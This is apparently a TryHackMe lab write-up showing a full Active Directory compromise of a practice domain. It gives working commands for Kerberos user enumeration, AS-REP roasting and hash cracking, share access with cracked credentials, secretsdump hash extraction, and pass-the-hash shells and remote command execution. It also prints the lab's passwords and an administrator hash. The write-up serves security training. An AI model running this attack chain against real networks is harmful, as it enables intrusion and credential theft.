# Active Directory Exploitation Walkthrough

> 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

## Enumeration

Starting off with an Nmap scan on the target (I have already exported the IP address of the target to the variable `$target`):

```bash
nmap -p- -sV -sC $target --open
```

We can see the Active Directory domain: `spookysec.local`.

This is a typical AD setup with services like Kerberos, SMB, RPC, and LDAP running. Let's enumerate these services one by one.

---

## SMB

Nmap revealed SMB ports open on **139, 445**.

### Tools:
- `enum4linux`
- `nmap` SMB scripts
- `crackmapexec`

Running:

```bash
enum4linux -smb $target

nmap -p139,445 --script=smb-enum-shares -sC $target

crackmapexec smb $target
```

> Why is port 445 open?  
Basic domain functions (remote file access, software deployment, system management) require it.

**crackmapexec** reveals:
- Hostname: `ATTACKTIVEDIREC`
- Domain: `spookysec.local`
- OS: Windows 10 / Server 2019 Build 17763

**enum4linux** reveals:
- Domain SID
- NetBIOS name

---

## Kerberos User Enumeration (Kerbrute)

This TryHackMe box comes with a user/password list.

```bash
sudo ./kerbrute_linux_amd64 userenum --dc $target -d spookysec.local userlist.txt
```

**Notable valid users:**
- `svc-admin`
- `administrator`
- `backup`

---

## AS-REP Roasting

ASReproasting targets users **without pre-authentication** required.

> AS-REP = Authentication Server Reply  
> Roasting = Extracting Kerberos-encrypted values for offline cracking

Using Impacket's `GetNPUsers.py`:

```bash
python3 examples/GetNPUsers.py spookysec.local/ -no-pass \
  -usersfile /home/kali/Downloads/userlist.txt -dc-ip 10.10.28.119
```

Result:

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[hash...]
```

### Hash Info:
- **Hash Type**: Kerberos 5, etype 23, AS-REP
- **Hashcat Mode**: 18200

### Cracking with Hashcat:

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

**Credentials:**
- Username: `svc-admin`
- Password: `management2005`

---

## SMBCLIENT (Accessing Shares)

Use found credentials:

```bash
smbclient -L \\$target -U svc-admin
```

To avoid the password prompt:

```bash
smbclient -L \\$target -U svc-admin%management2005
```

### Accessing a Share:

```bash
smbclient \\$target\backup -U svc-admin%management2005
```

Graphical Alternative (Kali GUI):
- Use `smb://IP/backup` in File Manager

---

## Downloading Files

Example:

```bash
get backup_credentials.txt
```

### Decode base64:

```bash
base64 -d backup_credentials.txt
```

---

## secretsdump.py (Dumping Hashes)

Use backup credentials:

```bash
python3 examples/secretsdump.py spookysec.local/backup:backup2517860@$target
```

**Administrator Hash:**
```
0e0363213e37b94221497260b0bcb4fc
```

---

## Pass-the-Hash with Evil-WinRM

```bash
evil-winrm -H 0e0363213e37b94221497260b0bcb4fc \
  -i 10.10.157.141 -u Administrator
```

> You should now have shell access. Use `cd`, `dir`, and `type` to browse and read files.

---

## Alternative Tools

### Netexec

```bash
netexec smb 10.10.157.141 -u backup -p backup2517860 --ntds
```

### crackmapexec (Command Execution)

```bash
crackmapexec smb 10.10.157.141 -u Administrator \
  -H 0e0363213e37b94221497260b0bcb4fc -x "whoami"
```

### crackmapexec (PowerShell)

```bash
crackmapexec smb 10.10.157.141 -u Administrator \
  -H 0e0363213e37b94221497260b0bcb4fc -X "whoami"
```

> PowerShell execution may be blocked by antivirus.

---

## Conclusion

Thanks for reading.  
If you have questions or want to share your thoughts, feel free to comment below.